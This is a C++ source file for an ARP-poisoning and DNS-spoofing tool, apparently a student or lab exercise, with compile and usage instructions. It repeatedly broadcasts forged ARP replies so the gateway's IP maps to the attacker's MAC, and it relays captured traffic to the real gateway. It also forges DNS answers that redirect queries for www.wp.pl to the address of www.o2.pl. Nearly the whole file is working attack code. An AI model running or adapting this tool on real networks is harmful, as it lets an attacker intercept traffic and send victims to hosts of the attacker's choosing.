/*
 *                           DNS SPOOFER
 * Compilation:  gcc -Wall ./dnspoof.c -o dnspoof -lnet -lpthread
 * Usage:        ./dnspoog INTERFACE DEFAULT_GATEWAY_IP DEFAULT_GATEWAY_MAC
 * NOTE:         This program requires root privileges.
 *
 */
#include <pcap.h>
#include <libnet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>

#include <thread>
#include <chrono>
#include <csignal>
#include <iostream>

#include "helper.h"

void spoof(const char *interface_name, char *address) {
    u_int32_t target_ip_addr, zero_ip_addr;
    u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
            zero_hw_addr[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    struct libnet_ether_addr *src_hw_addr;
    char errbuf[LIBNET_ERRBUF_SIZE];

    ln = libnet_init(LIBNET_LINK, interface_name, errbuf); // on IP layer
    // Returns the MAC address for the device libnet was initialized with:
    src_hw_addr = libnet_get_hwaddr(ln);
    // Takes a dotted decimal string or a canonical DNS name and returns a network byte ordered IPv4 address:
    target_ip_addr = libnet_name2addr4(ln, address, LIBNET_RESOLVE);
    // This may incur a DNS lookup if mode is set to LIBNET_RESOLVE and host_name refers to a canonical DNS name.
    zero_ip_addr = libnet_name2addr4(ln, const_cast<char *>("0.0.0.0"), LIBNET_DONT_RESOLVE);

    libnet_autobuild_arp(
            ARPOP_REPLY,                     /* operation type       */
            src_hw_addr->ether_addr_octet,   /* sender hardware addr (attacker's mac) */
            (u_int8_t *) &target_ip_addr,    /* sender protocol addr (gateway's ip)*/
            zero_hw_addr,                    /* target hardware addr (any MAC asked)*/
            (u_int8_t *) &zero_ip_addr,      /* target protocol addr */
            ln);                             /* libnet context       */
    libnet_autobuild_ethernet(
            bcast_hw_addr,                   /* ethernet destination */
            ETHERTYPE_ARP,                   /* ethertype            */
            ln);                             /* libnet context       */

    while (true) {
        libnet_write(ln);
        std::chrono::seconds sec = std::chrono::seconds(1);
        std::this_thread::sleep_for(sec);
    }

}

void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {

    size_t frame_size = h->caplen;


    // TODO move down... or up from here  :)
    int sfd_send;
    struct sockaddr_ll sall_send;
    struct ifreq interface_struct;          // interface structure -> needed for interface identification

    sfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    strncpy(interface_struct.ifr_name, interface_name, IFNAMSIZ);
    ioctl(sfd_send, SIOCGIFINDEX, &interface_struct);
    memset(&sall_send, 0, sizeof(struct sockaddr_ll));
    sall_send.sll_family = AF_PACKET;
    sall_send.sll_protocol = htons(ETH_P_ALL);
    sall_send.sll_ifindex = interface_struct.ifr_ifindex;
    sall_send.sll_hatype = ARPHRD_ETHER;
    sall_send.sll_pkttype = PACKET_OUTGOING;
    sall_send.sll_halen = ETH_ALEN;

    struct ethhdr *eth_hdr = (struct ethhdr *) frame;
    int header_size = sizeof(struct ethhdr);

    printFromToInfo(eth_hdr);
    printf("MESSAGE RECEIVED: \n");
    for (int i = 0; i < frame_size; i++) {
        if (i == 43) {
            printf(" -> ");
        }
        printf("%x ", frame[i]);
    }
    printf("\n");

    if (ntohs(eth_hdr->h_proto) == ETH_P_IP) {
        struct iphdr *ip_hdr = (struct iphdr *) (frame + header_size);
        header_size += (ip_hdr->ihl * 4);
        unsigned int ip_size = ntohs(ip_hdr->tot_len);    // h->caplen - sizeof(struct ethhdr) which is 14
        if (ip_hdr->protocol == 0x11) {
            struct udphdr *udp_hdr = (struct udphdr *) (frame + header_size);
            header_size += sizeof(struct udphdr);
            uint16_t port = ntohs(udp_hdr->dest);
            unsigned int udp_size = ntohs(udp_hdr->len);
            if (port == 53) {
                unsigned int dns_size = udp_size - sizeof(struct udphdr);
                std::cout << "FRAME_SIZE=" << frame_size << ", (-14)IP_SIZE=" <<
                          ip_size << ", (-20)UDP_SIZE=" << udp_size << ", (-8)DNS_SIZE=" << dns_size << "\n";
                if (dns_size > 0) {
                    struct DNS_HEADER *dns_header = (struct DNS_HEADER *) (frame + header_size);
                    header_size += sizeof(struct DNS_HEADER);
                    // TODO checking DNS_header flags and questNo?

                    char *dns_query = (char *) (frame + header_size);
                    int dns_query_size = dns_size - sizeof(struct DNS_HEADER) - sizeof(struct QUESTION);    // QUESTION = 2*2B at the end
                    char questionedAddress[dns_query_size];
                    strncpy(reinterpret_cast<char *>(questionedAddress), dns_query, static_cast<size_t>(dns_query_size));

                    char cmp_questioned_address[] = " www.wp.pl";
                    cmp_questioned_address[0] = 3;
                    cmp_questioned_address[4] = 2;
                    cmp_questioned_address[7] = 2;


                    if (strcmp(questionedAddress, cmp_questioned_address) == 0) {

                        struct hostent *addrent = gethostbyname("www.o2.pl");
                        if (addrent->h_length != 4) {
                            printf("%s", "ERROR!");
                        }
                        struct dns_answer answer = dns_answer(*(uint32_t *) addrent->h_addr_list[0]);

                        char* a = reinterpret_cast<char *>(&answer);
                        printf("%s\n", "ANSWER PRINT:");
                        for (int i = 0; i < DNS_ANSWER_SIZE; i++) {
                            printf("%x ", a[i]);
                        }
                        printf("\n");

                        u_int32_t datalen = dns_query_size + sizeof(struct QUESTION) + DNS_ANSWER_SIZE;
                        u_int8_t *data = (u_int8_t *) (malloc(datalen));

                        memcpy(data, dns_query, dns_query_size + sizeof(struct QUESTION));
                        memcpy(data + dns_query_size + sizeof(struct QUESTION), &answer, DNS_ANSWER_SIZE);

                        printf("%s\n", "DATA PRINT:");
                        for (int i = 0; i < datalen; i++) {
                            printf("%x ", data[i]);
                        }
                        printf("\n");

                        libnet_ptag_t t;
                        char errbuf[LIBNET_ERRBUF_SIZE];

                        ln = libnet_init(LIBNET_RAW4_ADV, interface_name, errbuf);
                        t = libnet_build_dnsv4(
                                LIBNET_UDP_DNSV4_H,
                                ntohs(dns_header->transId), /* DNS packet id */
                                0x8180,                     /* flags: standard reply, no error */
                                1,                          /* number of questions */
                                1,                          /* number of answer resource records */
                                0,                          /* number of authority resource records */
                                0,                          /* number of additional resource records */
                                data,                       /* optional payload or NULL */
                                datalen,                    /* payload length or 0 */
                                ln,                         /* pointer to a libnet context */
                                0);                         /* protocol tag to modify an existing header, 0 to build a new one */

                        t = libnet_build_udp(
                                53,                                             /* source port */
                                ntohs(udp_hdr->source),                         /* destination port */
                                LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + datalen,    /* packet size */
                                0,                                              /* checksum: (0 for libnet to autofill)*/
                                NULL,                                           /* payload or NULL*/
                                0,                                              /* payload size or 0*/
                                ln,                                             /* libnet handle */
                                0);                                             /* libnet id */

                        /* auto calculate the checksum */
                        libnet_toggle_checksum(ln, t, LIBNET_ON);

                        t = libnet_autobuild_ipv4( // autobuild is easier then build
                                LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + datalen, /* length */
                                IPPROTO_UDP,                                                 /* protocol */
                                ntohl(ip_hdr->saddr),                                        /* destination IP */
                                ln);                                                         /* libnet handle */

                        /* auto calculate the checksum */ libnet_toggle_checksum(ln, t, LIBNET_ON);
                        libnet_write(ln);

                        close(sfd_send);// TODO refactor, don't do this here!

                        return;
                    }
                }
            }
        }
    }

    // SEND FRAME
    // Change destination address to default gateway MAC
    sscanf(deafault_gateway_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &sall_send.sll_addr[0], &sall_send.sll_addr[1], &sall_send.sll_addr[2],
           &sall_send.sll_addr[3], &sall_send.sll_addr[4], &sall_send.sll_addr[5]);
    memcpy(eth_hdr->h_dest, &sall_send.sll_addr, ETH_ALEN);
    // Change source address to this computer MAC
    ioctl(sfd_send, SIOCGIFHWADDR, &interface_struct);
    memcpy(eth_hdr->h_source, &interface_struct.ifr_hwaddr.sa_data, ETH_ALEN);
    if (sendto(sfd_send, frame, (int) (frame_size), 0, (struct sockaddr *) &sall_send, sizeof(struct sockaddr_ll)) < 0) {
        printf("Error while sending: %s\n", strerror(errno));
    }
    printf("MESSAGE SEND: \n");
    for (int i = 0; i < frame_size; i++) {
        if (i == 43) {
            printf(" -> ");
        }
        printf("%x ", frame[i]);
    }
    printf("\n");

    close(sfd_send);
}

void capture(char *interface_name, char *address) {
    bpf_u_int32 netp, maskp;
    struct bpf_program fp;
    errbuf = static_cast<char *>(malloc(PCAP_ERRBUF_SIZE));          // alloc memory for error buffer
    handle = pcap_create(interface_name, errbuf);                   // alloc for handler
    pcap_set_promisc(handle, 1); // TODO
    pcap_set_snaplen(handle, 65535);                                // frame length
    pcap_activate(handle);

    // FILTERING:
    pcap_lookupnet(interface_name, &netp, &maskp, errbuf);   // get filter args
    std::string filter = createFilter(interface_name, address);
    pcap_compile(handle, &fp, filter.c_str(), 0, netp);      // compile filter
    if (pcap_setfilter(handle, &fp) < 0) {
        pcap_perror(handle, "pcap_setfilter()");
        exit(EXIT_FAILURE);
    }
    pcap_loop(handle, -1, trap, nullptr);        // run trap
}

int main(int argc, char **argv) {
    if (argc < 4) {
        std::cerr << "Bad arguments count! Arguments are: INTERFACE DEFAULT_GATEWAY_IP DEFAULT_GATEWAY_MAC\n";
        exit(EXIT_FAILURE);
    }
    interface_name = argv[1];
    address = argv[2];
    deafault_gateway_mac = argv[3];

    if (readConfigFile() == -1)
        exit(EXIT_FAILURE);

    std::signal(SIGINT, stop);

    std::thread arp_spoofer(spoof, argv[1], argv[2]);
    std::thread capturer(capture, argv[1], argv[2]);

    arp_spoofer.join();
    capturer.join();

    return 0;
}
